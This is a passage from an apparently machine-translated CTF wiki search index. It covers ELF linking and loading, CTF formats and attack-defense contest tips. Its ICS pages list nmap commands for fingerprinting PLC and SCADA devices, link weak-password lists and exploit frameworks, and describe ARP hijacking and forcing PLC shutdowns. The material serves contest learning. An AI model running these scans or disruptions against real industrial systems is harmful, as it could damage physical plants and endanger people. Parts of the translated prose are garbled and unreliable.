dependencies.</p> <p>When a dynamic linker creates a memory segment for an object file, the dependencies described in the DT_NEEDED entry give the service that depends on the file to support the program. The dynamic linker creates a complete process image by continually connecting the referenced shared object files (even if a shared object file is referenced multiple times, it will only be connected once by the dynamic linker) and their dependencies. When parsing symbol references, the dynamic linker uses BFS (broadness first search) to check the symbol table. That is, first, it checks the symbol table of the executable itself, and then checks the symbol table in the DT_NEEDED entry in order before continuing to view the next dependency, and so on. The shared object file must be readable by the program, and other permissions are not required.</p> <p>The name in the dependency list is either a string in DT_SONAME or the pathname of the shared object file used to build the corresponding target file. For example, if a linker uses a shared object file with the DT_SONAME entry name lib1 and a shared object file with a path named /usr/lib/lib2, the executable will contain lib1 and /usr/ Lib/lib2 dependency list.</p> <p>If a shared object file has one or more /, such as /usr/lib/lib2 or directory/file, the dynamic linker will use that string directly as the path name. If there is no / in the name, such as lib1, then the following three mechanisms give the order in which the shared object files are searched.</p> <ul> <li> <p>First, the dynamic array tag DT_RPATH may give a string containing a series of directories separated by :. For example /home/dir/lib:/home/dir2/lib: Tell us to search in the <code>/home/dir/lib</code> directory first, then search in <code>/home/dir2/lib</code>, and finally search in the current directory.</p> </li> <li> <p>Second, the variable named LD_LIBRARY_PATH in the process environment variable contains a list of directories of the above mentioned format, and there may be one at the end; followed by another directory listing followed by another directory listing. Here is an example with the same effect as the first one.</p> </li> <li> <p>LD_LIBRARY_PATH=/home/dir/lib:/home/dir2/lib:</p> </li> <li> <p>LD_LIBRARY_PATH=/home/dir/lib;/home/dir2/lib:</p> </li> <li> <p>LD_LIBRARY_PATH=/home/dir/lib:/home/dir2/lib:;</p> </li> </ul> <p>All directories in LD_LIBRARY_PATH will only be searched after searching for DT_RPATH. Although some programs (such as the link editor) are dealing; the list is different in the way it is, but the dynamic linker handles it in exactly the same way. In addition, the dynamic linker accepts the semicolon representation syntax, as described above. .</p> <ul> <li>Finally, if the above two directories cannot locate the desired library, the dynamic linker searches for libraries under the <code>/usr/lib</code> path.</li> </ul> <p>note</p> <p>&gt; ** For security purposes, for programs identified by <code>set-user</code> and <code>set-group</code>, the dynamic linker ignores search environment variables (eg <code>LD_LIBRARY_PATH</code>) and only searches for directories specified by <code>DT_RPATH</code> and <code>/usr/ Lib</code>. **</p>"},{"location":"executable/elf/program-loading/","title":"Program Loading","text":""},{"location":"executable/elf/program-loading/#loading","title":"Loading","text":"<p>The program loading process is actually the process of creating or expanding the process mirror. It simply copies the segments of the file into the virtual memory segment according to certain rules. The process will apply for the corresponding physical page only if the corresponding logical page is used in the process of execution. In general, many pages in a process are not referenced. Therefore, delaying physical reads and writes can improve system performance. In order to achieve such efficiency, the executable file and the file offset and virtual address of the segment owned by the shared object file must be appropriate, that is, they must be integer multiples of the page size.</p> <p>In the Intel architecture, the virtual address and file offset must be 4KB integers, or a larger integer multiple of 2.</p> <p>Below is an example of an executable file loaded into memory layout</p> <p></p> <p>The corresponding code segment and the data segment are explained as follows</p> <p></p> <p>In this example, although the code segment and the data segment are equal in the sense of modulo 4KB, there are still up to 4 pages containing impure code or data. Of course, in practice it will depend on the page size or the block size of the file system.</p> <ul> <li>The first page of the code snippet contains the ELF header, the program header table, and other information.</li> <li>The last page of the code segment contains a copy of the beginning of the data segment.</li> <li>The last page of the data segment contains a copy of the last part of the code segment. As for how much, it has not been explained yet.</li> <li>The last part of the data segment may contain information that is not relevant to the program's operation.</li> </ul> <p>Logically speaking, the system will force the control of memory permissions, just like the permissions of each segment are completely independent; the segment address will be adjusted to ensure that each logical page in memory has only one type of permission. . In the example given above, the last part of the code segment of the file and the beginning of the data segment are mapped twice: the virtual address of the data segment and the virtual address of the code segment.</p> <p>The end of the data segment needs to deal with the data that has not been initialized. Generally, the system requires them to start with 0. Therefore, if the last page of a file contains information that is not in the logical page, the remaining data must be initialized to zero. The impurity data in the remaining three pages is not logically part of the process image, and the system can choose to delete them. The virtual memory image corresponding to this file is as follows (assuming each page is 4KB in size)</p> <p></p> <p>When you load a segment, the executable is different from the shared object. Executable files usually contain absolute code. In order to be able to make the program execute correctly, each segment should be at the virtual address used to build the executable. Therefore, the system directly uses p_vaddr as a virtual address.</p> <p>On the other hand, shared object files usually contain address-independent code. This makes the virtual address of the same segment different in different processes, but this does not affect the execution behavior of the program. Although the system chooses different virtual addresses for different processes, it still maintains the relative addresses of the segments. Because the address independent code uses relative addresses in different segments, the difference between the virtual addresses in virtual memory is definitely the same as the difference between the corresponding virtual addresses in the file. The following is a list of possible different processes for the same shared object file, describing relative address addressing, and this table also gives a calculation of the base address.</p> <p></p>"},{"location":"executable/elf/running-overview/","title":"Program Execution Flow","text":""},{"location":"executable/elf/running-overview/#program-execution-process","title":"Program execution process","text":"<p>\u53c2\u8003 Execution Angleboye@Bamboofox \u3002</p>"},{"location":"executable/elf/running-overview/#basic-overview","title":"Basic Overview","text":""},{"location":"executable/elf/running-overview/#static-execution","title":"Static execution","text":"<p>Here is the basic process of static execution of the program.</p> <p></p>"},{"location":"executable/elf/running-overview/#dynamic-execution","title":"Dynamic execution","text":"<p>Here is another more detailed picture.</p> <p></p>"},{"location":"executable/elf/running-overview/#basic-operation-instructions","title":"Basic operation instructions","text":""},{"location":"executable/elf/running-overview/#sys_execve","title":"sys_execve","text":"<p>This function is mainly used to execute a new program, that is, execute the program we want to execute, and check the corresponding parameters such as argv and envp.</p>"},{"location":"executable/elf/running-overview/#do_execve","title":"do_execve","text":"<p>This function opens the target image file and reads the specified length (currently 128 bytes) from the beginning of the target file to get the basic information of the corresponding target file.</p>"},{"location":"executable/elf/running-overview/#search_binary_handler","title":"search_binary_handler","text":"<p>This function searches for a binary type queue that supports handling of the current type, so that the handlers of various executable programs can be processed accordingly.</p>"},{"location":"executable/elf/running-overview/#load_elf_binary","title":"load_elf_binary","text":"<p>The main processing flow of this function is as follows</p> <ul> <li> <p>Check and get the header information of the elf file.</p> </li> <li> <p>If the target file is dynamically linked, use the .interp section to determine the path to the loader.</p> </li> <li> <p>Map the corresponding segments recorded in the program header to memory. The following important information in the program header</p> </li> <li> <p>the address to which each segment needs to be mapped</p> </li> <li>The appropriate permissions for each segment.</li> <li>Record which sections belong to which sections.</li> </ul> <p>The specific mapping is as follows</p> <p></p> <p>Case processing</p> <ul> <li>In the case of dynamic linking, change the return address of sys_execve to the entry point of loader (ld.so).</li> <li>In the case of static linking, change the return address of sys_execve to the entry point of the program.</li> </ul>"},{"location":"executable/elf/running-overview/#ldso","title":"ld.so","text":"<p>This file has the following features</p> <ul> <li>Mainly used to load shared libraries recorded in DT_NEED in ELF files.</li> <li>Initialization work</li> <li>Initialize the GOT table.</li> <li>Merge the symbol table into the global symbol table.</li> </ul>"},{"location":"executable/elf/running-overview/#_start","title":"_start","text":"<p>The _start function will hand over the following to libc_start_main</p> <ul> <li>Environment variable start address</li> <li> <p>.init</p> </li> <li> <p>Initialization before starting the main function</p> </li> <li>ends</li> <li>Finishing work before the end of the program.</li> </ul>"},{"location":"ics/ctfs/","title":"ICS_CTF Contest","text":"<p>&gt; The content of this column, the content of the ICS CTF competition comes from the author's own experience in playing the game. If it is not right, please criticize and correct the teacher.</p>"},{"location":"ics/ctfs/#domestic-industrial-control-competition-inspection-point","title":"Domestic industrial control competition inspection point","text":"<p>Using the CTF classification model to summarize and analyze the key points in the current industrial control ICS competition</p> Competition Type Investigation Point Similar to CTF <p>|Intranet penetration|Web-side penetration testing, CMS system, industrial control release display system, database system|related to Web penetration | Reverse Analysis | Firmware Analysis, Industrial Control Software Reverse | Actual Scene Reverse | | Industrial Control Protocol | Industrial Control Flow Analysis, Misc Class | Misc Flow Analysis, Industrial Control Flow Characteristics | | Industrial Control Programming | PLC Configuration, HMI Configuration, RTU Configuration, etc. | Industrial Control Configuration Software Use, Ladder Recognition and Analysis |</p> <p>According to the type of vulnerability, it is also possible to distinguish the types of refinement topics, including common Web injection classes, firmware weak passwords, backdoor programs, protocol replay and logic issues, configuration deployment issues, and other common industrial security scenarios.</p> Competition Type Vulnerability Type <p>|Intranet penetration|Web class (SQL, XSS, command injection, sensitive file disclosure. git/.idea/.project, etc.) | Reverse Analysis | Firmware Analysis, Industrial Control Software Reverse | Actual Software, DLL, ELF, MIPS Reverse | | Industrial Control Protocol | Industrial Control Flow Analysis, Misc Class | Misc Flow Analysis, Industrial Control Flow Characteristics | | Industrial Control Programming | PLC Configuration, HMI Configuration | Industrial Control Real Configuration Software Use, Ladder Recognition and Analysis |</p> <p>In view of the types of ICS CTFs that have appeared or have appeared in the past, there are many coincidences with the CTF competition. Therefore, this is not to be repeated. It is mainly discussed in the CTF that is not consistent with the CTF competition.</p>"},{"location":"ics/ctfs/#web-penetration-class-web","title":"Web penetration class (Web)","text":"<p>This section focuses on the characteristics of industrial control Web penetration:</p> <ul> <li>Highly compatible with business scenarios. For example, in industrial control, the Web terminal mainly displays information such as control parameters and running status in the current usage scenario. If it is hijacked by an intermediary in the internal network, the HMI display device cannot run the device in real time with the PLC. When synchronizing, the system will alarm or make an error.</li> <li>General use of common technology to display the Web interface, with the Windows operating system as the main platform, including WinCC, Windows Server, Windows 98/2000/XP and other seemingly ancient systems.</li> <li>Web infiltration will retain multiple ports, such as FTP, HTTPS, Telnet, SNMP, NTP and other service ports, you can try other ports while Web penetration can not be penetrated.</li> <li>Because industrial control is generally in the internal network environment, intranet hijacking is often more effective. However, if the internal network is configured with static IP or other protection measures, the intranet hijacking method such as ARP spoofing mode cannot take effect.</li> <li>Sensitive information leaks and incomplete configuration files are common problems in industrial control web publishing. Not only include engineering information protocols such as .git/.idea/.project, but also path traversal, command injection, weak passwords, etc.</li> </ul>"},{"location":"ics/ctfs/#reverse-analysis-reverse","title":"Reverse Analysis (Reverse)","text":"<p>This section mainly discusses the characteristics of industrial control reverse:</p> <ul> <li>The industrial control operating system is generally RTOS (Real Time Operate System). For example, real-time operating systems such as vxworks and uc-os need to be familiar with the architecture and instruction set in the reverse direction. If you do not understand, please learn by yourself.</li> <li>The common target of industrial control firmware reverse is the common firmware reverse vulnerability such as industrial control engineering encryption algorithm, hard coded key, hard coded backdoor, etc. If a stack overflow vulnerability is discovered, it can often lead to target device downtime (ie DOS consequences).</li> <li>The firmware of the industrial control often has encryption and compression. It needs to be decompressed or decrypted in the first step of decompression. This part is based on the specific manufacturer and cannot be generalized.</li> <li>Industrial control firmware has no reverse analysis</li> </ul>"},{"location":"ics/ctfs/#industrial-control-protocol-protocol","title":"Industrial Control Protocol (Protocol)","text":"<p>This section mainly talks about the relevant characteristics of industrial control protocol topics:</p> <ul> <li>The industrial control protocol is designed for industrial control scenarios, with features such as simplicity, high efficiency, and low latency. Therefore, simple attacks such as replay and command injection can be considered for such attacks.</li> <li>The industrial control protocol not only uses the public agreement, but also includes a large number of private agreements. The specific details of this part of the agreement need to reverse or collect data to achieve the restoration of data functions. For example, Modbus, DNP3, Melsec-Q, S7, Ethernet/IP, etc.</li> <li>The industrial control protocol may cause problems such as downtime and non-restart of the target PLC, DCS, RTU, etc. The Fuzz-based method can quickly and efficiently find the PLC downtime vulnerability.</li> <li>There may be many operations in the industrial control protocol for devices such as PLCs. Users need to distinguish between legal requests and exception requests. This requires experience and needs to study the logic of the current traffic. This scene is very suitable for the conditions of machine learning, which can be considered as a direction of exploration.</li> <li>The actual defense scheme for the industrial control scenario is actually the best bypass detection. The traffic is connected to the analysis system through the splitting, and the target system is monitored safely without affecting the normal service usage.</li> </ul>"},{"location":"ics/ctfs/#program","title":"\u5de5\u63a7\u7f16\u7a0b(Program)","text":"<p>Industrial control programming is the core and focus of the operation of industrial control systems. The characteristics of such topics are generally:</p> <ul> <li>The core of industrial control programming is to understand the logic of industrial control business, and the industrial control programming follows IEC61131-3 (the first standard in the history of industrial control to realize joint programming of PLC, DCS, motion control, SCADA, etc. - IEC61131-3), including five programming language standards. The three types are graphical languages (ladder diagrams, sequential function diagrams, and function block diagrams), and two are textual languages (instruction tables and structured text).</li> <li>Industrial control equipment can often be debugged online, so that some input and output ports can be controlled to realize the function of forced start and stop. If these functions can be retransmitted by Remote, the attack hazard is more serious.</li> <li>Industrial control equipment is connected in a variety of ways, generally using a serial port, but the current development of the device supports Ethernet, USB interface and other new methods, if the network port does not try serial port, USB.</li> <li>The industrial control configuration can be very complicated. It is even possible to connect hundreds or thousands of inputs and outputs. The configuration will be more troublesome due to the addition of new components. At this time, you should look slowly and pick it up a little bit.</li> </ul> <p>The above is some of my experience in participating in the industrial control competition, hoping to give more guidance to the small partners who will participate in the competition.</p>"},{"location":"ics/discover/","title":"ICS_CTF Discovery","text":"<p>&gt; The content of this column, the content of the ICS CTF competition comes from the author's own experience in playing the game. If it is not right, please criticize and correct the teacher.</p>"},{"location":"ics/discover/#industrial-equipment-discovery","title":"Industrial equipment discovery","text":"<p>Industrial control equipment discovery is the premise of industrial control competition. At present, in the industrial control equipment scanning, a large number of tools are integrated in Nmap, Metasploit and Censes to mine current online PLC, DCS and other ICS equipment.</p>"},{"location":"ics/discover/#industrial-control-scan-script","title":"Industrial Control Scan Script","text":""},{"location":"ics/discover/#information-scanning-script-based-on-industrial-control-port","title":"Information scanning script based on industrial control port","text":"<p>How to find industrial control equipment in a large number of IP, in addition to industrial control special port accidents, a large number of ports are normal services, such as ftp, ssh, telnet, smtp, ntp and other normal network services. The following list lists the current open source industrial control scan scripts.</p> Port Protocol/Device Source <p>|102(TCP)|siemens s7|nmap --script s7-info.nse -p 102 [host] nmap -sP --script      s71200-enumerate-old.nse -p 102 [host]|</p> <p>|502(TCP)|modbus|nmap --script modicon-info -p 502 [host]|</p> <p>|2404(TCP)|IEC 60870-5-104|nmap -Pn -n -d --script iec-identify.nse  --script-args='iec-identify.timeout=500' -p 2404 [host]|</p> <p>|20000(TCP)|DNP3|nmap -sT --script dnp3-enumerate.nse -p 20000 [host] nmap --script dnp3-info -p 20000 [host]|</p> <p>|44818(TCP)|Ethernet/IP|nmap --script enip-enumerate -sU  -p 44818 [host]|</p> <p>|47808(UDP)|BACnet|nmap --script BACnet-discover-enumerate.nse -sU  -p 47808 [host]|</p> <p>|1911(TCP)|Tridium Nixagara Fo|nmap --script fox-info.nse -p 1911 [host]|</p> <p>|789(TCP)|Crimson V3|nmap --scripts cr3-fingerprint.nse -p 789 [host]|</p> <p>|9600(TCP)|OMRON FINS|nmap --script ormontcp-info -p 9600 [host]|</p> <p>|1962 (TCP)|PCWorx|nmap --script pcworx-info -p 1962 [host]|</p> <p>|20547(TCP)|ProConOs|nmap --script proconos-info -p 20547 [host]|</p> <p>|5007(TCP)|Melsec-Q|nmap -script melsecq-discover -sT -p 5007 [host]|</p> <p>|5006|Melsec-Q|nmap -script melsecq-discover-udp.nse -sU -p 5006 [host]|</p> <p>|956(TCP)|CSPV4|Unknown|</p> <p>|4840(TCP)|OPCUA|Unknown|</p> <p>|18245(TCP)|GE SRTP|Unknown|</p> <p>|1200(TCP)|Codesys|nmap \u2013script codesys-v2-discover.nse [host]|</p> <p>|10001|atg|nmap --script atg-info -p 10001 [host]|</p> <p>|2222|cspv4|nmap --script cspv4-info -p 2222 [host]|</p> <p>|1911|fox|nmap --script fox-info.nse -p 1911 [host]|</p> <p>|4800|moxa|nmap -sU --script moxa-enum -p 4800 [host]|</p> <p>| 137 | siemens wincc | sudo nmap -sU --script Siemens-WINCC.nse -p137 [host] | |445|stuxnet|nmap --script stuxnet-detect -p 445 [host]|</p> <p>The above script does not completely list the current use of script information, which is not yet to be continued...</p>"},{"location":"ics/discover/#component-scanning-method-based-on-industrial-control-configuration-software","title":"Component scanning method based on industrial control configuration software","text":"<p>Each industrial control manufacturer often comes with configuration software. When configuring the software, it can independently discover the target PLC device when connecting the devices in the current intranet.</p> Port Protocol/Device Connection Method <p>|102(TCP)|siemens s7|Siemens Software Step7 comes with scanning the current network segment PLC device function| |502(TCP)|modbus|Schneider SoMachine Basic Connect PLC device with scanning intranet segment function|</p>"},{"location":"ics/discover/#industrial-control-scanning-and-discovery-engine","title":"Industrial Control Scanning and Discovery Engine","text":""},{"location":"ics/discover/#shodan","title":"Shodan \u64ce","text":"<p>*Shodan is a cyberspace search engine that searches for devices, servers, cameras, industrial control devices, smart homes, etc. that exist on the Internet and can identify their version, location, port, service and other information. In 2013, Shodan added detection for industrial control protocols. Users can directly retrieve all data of the protocol using the port of the industrial control protocol. Users can also use the feature Dork to directly search for corresponding device data. *</p>"},{"location":"ics/discover/#zoomeye-engine","title":"Zoomeye Engine","text":"<p>*ZoomEye is a search engine for cyberspace created by Chuangyu. ZoomEye launched the industrial control project (ics.zoomeye.org) in March 2015. ZoomEye supports data retrieval for 12 industrial control protocols. Users can also use the industrial control protocol. Ports and Features The Dork keyword finds industrial hardware and software exposed to the Internet. For industrial control protocol type data, ZoomEye enables a protection policy that cannot be viewed directly by normal users. *</p>"},{"location":"ics/discover/#fofa-engine","title":"FOFA Engine","text":"<p>FOFA is a cyberspace asset search engine launched by White Hat. It can help users quickly match network assets and speed up the follow-up work process. For example, vulnerability analysis scope analysis, application distribution statistics, application popularity ranking statistics, etc.</p>"},{"location":"ics/discover/#diting-full-net-engine","title":"Diting Full Net Engine","text":"<p>*Ditecting cyberspace industrial control equipment search engine, to listen to the meaning of all things, is intended to search for industrial control system networking equipment exposed on the Internet, to help security manufacturers maintain industrial control system security, follow the malicious intentions. *</p>"},{"location":"ics/discover/#censys-full-network-engine","title":"Censys Full Network Engine","text":"<p>*Censys is a search engine that allows computer scientists to understand the devices and networks that make up the Internet. Driven by Internet-wide scanning, Censys enables researchers to find specific hosts and create configuration and deployment information for devices, websites, and certificates into a single overall report. *</p> <p>The types of vulnerability engines are different, and there are big differences in configuration and deployment nodes. Currently, the search engine for industrial control is more professional with shodan and ditecting, but from the perspective of ports, each engine claims that the retrieval method is not Do the same.</p>"},{"location":"ics/discover/#comparison-of-various-search-engines","title":"Comparison of various search engines","text":"<p>To be continued.....</p>"},{"location":"ics/exploit/","title":"ICS_CTF Exploit","text":"<p>&gt; The content of the ICS CTF competition comes from the author's own experience in playing the game. If there is something wrong, please forgive me.</p> <p>Exploit is a variety of exploits for a vulnerability, and there are many ways to exploit a vulnerability. For the industrial control field, in fact, the most common use methods: configuration utilization, communication hijacking, Web penetration.</p>"},{"location":"ics/exploit/#configuration-utilization","title":"Configuration Utilization","text":"<p>Configuration is the core of the industrial control scene, and is the core content of the industrial control programming and implementation functions. If you do not understand the configuration, please learn the related books of the industrial control system configuration in the automation field. The best way to learn is to get the relevant product manual and learn about the content of the manual.</p> <p>Configuration utilization:</p> <ol> <li>Force IO (the most useful debugging method)</li> <li>Engineering encryption and decryption (engineering encryption is a protection measure for PLC, but there is still the possibility of being cracked)</li> <li>Upload and download (basic concept please make up for it)</li> <li>The memory distribution of target devices such as PLC (the basic concept please make up for it)</li> <li>Other additional features (such as ftp, ntp, etc.)</li> </ol>"},{"location":"ics/exploit/#communication-hijacking","title":"Communication hijacking","text":"<p>Communication hijacking is the most classic use in industrial control scenarios, such as ARP hijacking, PLC/HMI communication hijacking, PLC session hijacking, and PLC command execution. Communication hijacking method:</p> <ol> <li>ARP hijacking, ARP hijacking can block the communication between PLC and other devices. Since the project will have interactive addresses such as write dead IP, it may not be useful, but it is worth a try.</li> <li>PLC/HMI communication hijacking, using bypass equipment to access or control PLC equipment, forcibly rewriting or outputting IO</li> <li>PLC command execution, the most sensitive part of the industrial control equipment is equipment down (unrecoverable), equipment start and stop, equipment forced update parameters, etc. These can have a greater impact on the general process.</li> </ol>"},{"location":"ics/exploit/#web-penetration","title":"Web penetration","text":"<p>Target enterprises often have Web-based industrial control applications, such as publishing process release pages, user databases and other pages, which are basically the same as weekday Web topics.</p> <ol> <li>Weak password (common in industrial control, manufacturer default password in industrial equipment)</li> <li>Command injection (commonly used, need to audit Web project source code)</li> <li>Directory traversal (simple hand test, difficult to use, need to be combined with uploading and other functions)</li> <li>Preset backdoors (more difficult to find, need to combine reverse and web penetration)</li> <li>SQL class injection (simple)</li> <li>XSS is basically useless here (basically not encountered)</li> <li>Project file leaked (project files such as .git/.idea/.project are leaked)</li> </ol>"},{"location":"ics/learn/","title":"ICS_CTF Learning Resources","text":"<p>&gt;EscortLab collects and organizes a series of related IoT data for everyone to learn</p> <p>IoT Industry Information https://www.iotdunia.com/iotdunia</p>"},{"location":"ics/learn/#using-the-framework","title":"Using the framework","text":"<ol> <li>isf uses the framework https://github.com/dark-lbp/isf</li> <li>isf uses the framework https://github.com/w3h/isf</li> </ol>"},{"location":"ics/learn/#organizing-ics-resources","title":"Organizing ICS resources","text":"<ol> <li> <p>icsmaster https://github.com/w3h/icsmaster</p> </li> <li> <p>rapidscada https://github.com/RapidScada/scada</p> </li> </ol>"},{"location":"ics/learn/#weak-password-collection","title":"weak password collection","text":"<ol> <li>Industrial Control Weak Password https://github.com/scadastrangelove/SCADAPASS</li> <li>TOP1 million series weak password https://github.com/danielmiessler/SecLists/tree/master/Passwords</li> </ol>"},{"location":"ics/learn/#honey-pot-honeypot","title":"honey pot honeypot","text":"<ol> <li>Conpot https://github.com/mushorg/conpot</li> </ol>"},{"location":"ics/learn/#using-gadgets","title":"Using gadgets","text":"<ol> <li>PLC scan discovery tool PLCscan https://code.google.com/archive/p/plcscan/source</li> </ol>"},{"location":"ics/learn/#industrial-control-situational-awareness","title":"Industrial Control Situational Awareness","text":"<ol> <li>[NSA developed industrial control ICS/SCADA situational awareness open source tool Grassmarlin] (https://github.com/iadgov/grassmarlin)</li> </ol>"},{"location":"introduction/content/","title":"CTF Competition Topics","text":"<p>Because the topics covered in CTF questions are broad, there are no clear boundaries as to what will be tested. Based on the current CTFs questions, topics mainly include these six categories:  Web \u2013 Web Application Exploitation, RE - Reverse Engineering, Pwn - Binary Exploitation, Crypto - Cipher Attacks, Mobile - Mobile Security and Misc - Miscellaneous</p> <ul> <li>Web \u2013 Web Application Exploitation</li> </ul> <p>The Web topic mainly introduces common vulnerabilities in web apps, such as SQL injection, XSS, CSRF, file inclusion, file uploading, code auditing, PHP weaknesses, etc. Also, the common problem types, solving methods, and tools used.</p> <ul> <li>RE - Reverse Engineering</li> </ul> <p>The RE topic mainly introduces common types of questions seen in RE challenges, reversing platforms, and solving methods. The advanced section introduces software protection, decompilation, anti-reversing, and packing and unpacking techniques.</p> <ul> <li>Pwn - Binary Exploitation</li> </ul> <p>The Pwn topic mainly introduces the exploitation and utilization of binary vulnerabilities, which requires a understanding of the underlying operating system. In the CTFs, the pwn problems are mainly on Linux.</p> <ul> <li>Crypto - Cipher Attacks</li> </ul> <p>The Crypto topic mainly includes two parts: classical ciphers and modern cryptography. Classical ciphers are interesting and diverse. Modern cryptography has high security and requires a deeper understanding of the algorithms used.</p> <ul> <li>Mobile - Mobile Security</li> </ul> <p>The Mobile topic mainly introduces the common tools and problems types in Android reverse engineering. Android reverse engineering often requires some Android development knowledge. IOS reverse problems rarely appear in CTFs, so it won\u2019t be covered.</p> <ul> <li>Misc - Miscellaneous</li> </ul> <p>The Misc topic mainly includes information gathering, coding, forensics, steganography, and etc.</p>"},{"location":"introduction/content/#national-college-student-information-security-contest-challenges-topics","title":"National College Student Information Security Contest - Challenges Topics","text":"<p>In 2016, the National College Students Information Security Contest began to hold innovative practical skills competitions, which adopts the traditional CTF competition system. In the \"2016 National College Students Information Security Contest Guide&amp;quot, the following topics are given by the organizer:</p> <ol> <li>System security. Involves operating system and web system security, including code audit in multiple languages (especially PHP), database management and SQL operations, web vulnerability discovery and exploit (such as SQL injection and XSS), getting shell on server, patching security vulnerabilities.</li> <li>Reverse engineering. Involves the use of multiple programming languages on Windows/Linux/Android platforms to analyze source code and binary files with tools, Reverse engineering Android mobile application and APK files, encryption and decryption, kernel programming, algorithm, debugging, and code obfuscation technologies.</li> <li>Binary Exploitation. Involves using languages such as C/C++/Python/PHP/Java/Ruby/Assemble, explore Windows/Linux (x86/x86_64 platform) binary bugs, understand buffer overflows and format string attacks, and writing shellcode.</li> <li>Cryptography. Involves classical ciphers and modern cryptography, analyze cryptographic algorithms, calculate keys to perform encryption and decryption operations.</li> <li>Miscellaneous. Involves information gathering, programming, mobile security, cloud computing security, trusted computing, autonomous controllable, steganography, forensics, file recovery, computer network foundation, and network traffic analysis.</li> </ol>"},{"location":"introduction/experience/","title":"Attack and Defense Experience Summary","text":"<p>First, the competition will provide a portal to submit flags. The URL of the portal is like this: <code>http://172.16.4.1/Common/submitAnswer</code>. We need to use the information in the document to connect to the portal and submit flags. To submit flags, you need to use HTTP Post method with two parameters. One parameter <code>answer</code> is value of the flag, the other parameter <code>token</code> is value of the team's token.</p> <p>During the competition, the organizer will also provide each participating team with a virtual machine for analyzing network traffic, and players need to download the network traffic file and analyze it.</p>"},{"location":"introduction/experience/#pay-attention-to-the-gameboxs-status","title":"Pay attention to the Gamebox's status","text":"<p>In the competition, you can check your own and your opponent's Gamebox status during a match. Paying attention to the status so you can pick up information early and adjust based on that information.</p> <p>There are several reasons why your GameBox is down:</p> <ol> <li>There was an error in the organizer's system that incorrectly displayed the Gamebox\u2019s status. In this case, problems can normally be discovered before the competition. If you found issues in organizer's system, inform staff as early as possible to minimize damage.</li> <li>The patch program can accidentally cause the service to be unavailable. Check the Gamebox\u2019s status after the patch, if the service is unavailable, fix it immediately. You don't worry about replacing it with an unpatched service/program since when the service is down, teams won't lose too many points. However, the unpatched service/program will be exploited by top teams to obtain more points. You need to deal with this type of situation on a case-by-case basis.</li> <li>Teams might use illegitimate attack methods that will bring down the Gamebox, if discovered, fix it immediately.</li> <li>The organizer modifies the check program. In that case, the organizer will notify all the teams. You will a majority of the Gamebox are unavailable.</li> </ol> <p>You can get the following information about the opponent\u2019s Gamebox:</p> <ol> <li>Determine which teams failed to defend their GameBox based on network traffic. So, more attacks can be made against these teams.</li> <li>When a team gets First Blood, you can tell if the First Blood team used an exploit based on each teams\u2019 Gamebox status.  Furthermore, you can see which team's defense didn't work.</li> </ol>"},{"location":"introduction/experience/#knowing-the-network-segment-and-ports","title":"Knowing the network segment and ports","text":"<p>During the competition, the organizer will assigned a network segment.</p> <p>In maintenance, your team must be on the assigned network segment to connect to the Gamebox. Then login based on the CTF username and password provided. This network segment will allow you interact with another team\u2019s Gamebox and vulnerable programs.</p> <p>Warning</p> <p>Here you must pay close attention to the port. If a port is mistyped or mistaken, then it might bring unnecessary problems, like unable to submit flags. Mistyping the port is hard to detect. So, you should double-check and make sure the port is correct.</p>"},{"location":"introduction/experience/#service-patch-and-defense","title":"Service patch and defense","text":"<ol> <li>The patch program needs to meet the judge\u2019s system check requirements. Even though what the system check actually checks are not disclosed, it\u2019s not too difficult to pass.</li> <li>Use IDA to modify the patch program. IDA provides 3 ways to patch: byte, word, assemble. The byte method is easy to use since you don\u2019t need assembly instructions. Generally, such modification is also very small and efficient. Assembly instruction-level modifications, while convenient without the need to modify the bytecode, can also cause some inconvenience. For example, having to worry about the length of the assembly instruction, if the structure is complete, and whether the logic and modified instruction are correct, etc.</li> <li>Remember to back up the vulnerable program before the patch for team analysis. Before updating the patch, remove the vulnerable program. Then, copy the patch and give it proper permissions.</li> <li>In general, there are around ten locations that need to patch in the vulnerable program. The patch should not only be effective but also add protection or confusion to your opponent's analysis</li> </ol>"},{"location":"introduction/experience/#use-a-script-to-attack-quickly","title":"Use a Script to Attack Quickly","text":"<p>Fast attack scripts can maintain the advantage position in the early stage. At the same time getting points and saving time for defending.</p>"},{"location":"introduction/experience/#some-tricks-used-in-the-competition","title":"Some Tricks Used in the Competition","text":"<ol> <li>During the competition, don\u2019t spend too long on a single question. Because of the advantage you get for obtaining First Blood, you should understand the overall difficulty of challenges. Start from the easier question and work your way up.</li> <li>During the competition, you should try to attack teams that are similar or above your skill level. especially if they have around the same score as your team. Remember to buff up your defense.</li> <li>During the competition, NPC (non-player characters) will randomly send your attack traffic. In the attack traffic, the payload can be obtained.</li> <li>Be sure to attack the NPC.</li> <li>At the beginning of the competition, you can change all the passwords to one password. That way, it\u2019s easier to share and use. Also, back up all the files given and share them with the team.</li> </ol>"},{"location":"introduction/history/","title":"CTF History","text":"<p>The content of this column is taken from the public video \"The Past, Present and Future of CTF\" by Teacher Zhuge Jianwei in the Spring Festival.</p>"},{"location":"introduction/history/#origin-of-ctf","title":"Origin of CTF","text":"<p>CTF originated from the competition game between hackers in the fourth DEFCON in 1996.</p>"},{"location":"introduction/history/#early-years-of-ctf","title":"Early Years of CTF","text":"<p>The first CTF (1996-2001) has no clear rules, no professionally built platform or environment. Each team prepares their own objective (defending their own objective, while attacking opponents' objective). Most of the organizers are just enthusiastic non-professional volunteers who assist in manual scoring.</p> <p>Great controversy and dissatisfaction were due to the lack of an automated scoring system and technical competence among judges, many scoring delays and errors, unreliable network, and improper configuration.</p>"},{"location":"introduction/history/#modern-ctf-competition","title":"\"Modern\" CTF Competition","text":"<p>A professional organizer will manage the competition platform, create challenges, and implement competitions with an automated scoring system. The participating teams are required to apply for participation and will be selected by the organizers of the DEFCON in a meeting.</p> <p>During the three years with LegitBS organizing the DEFCON CTF competition, a few modifications have been made:</p> <ul> <li>The competition focuses on the inner workings of the computers, its security features and capabilities. Web exploitation has been completely ignored.</li> <li>Various CPU architectures, operating systems, and languages.</li> <li>The \"Zero-Sum\" scoring rule.</li> <li>A wider skillset required: reverse engineering, vulnerability discovery, pwning, patching, network traffic analysis, system security, programming and debugging.</li> </ul>"},{"location":"introduction/mode/","title":"CTF Competition Types","text":""},{"location":"introduction/mode/#problem-solving-mode-jeopardy","title":"Problem Solving Mode - Jeopardy","text":"<p>The problem-solving type (Jeopardy) is a common format in online CTF competitions. In a Jeopardy CTF, the participating teams can participate through the Internet or the on-site network. Furthermore, teams can use the online environment to communicate and share files, solve technical challenges, and submit the answers to score points.</p> <p>What\u2019s different in Jeopardy is that the first three teams that solve a challenge get rewarded with extra points. 